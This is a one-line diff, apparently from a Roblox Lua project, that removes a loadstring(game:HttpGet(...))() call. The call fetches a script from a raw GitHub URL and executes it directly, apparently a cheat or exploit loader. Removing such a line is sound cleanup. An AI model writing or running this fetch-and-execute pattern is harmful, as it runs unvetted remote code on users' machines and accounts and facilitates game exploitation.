@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/runaways-beta-spam1-kzo1trcbmc6mju.lua"))()
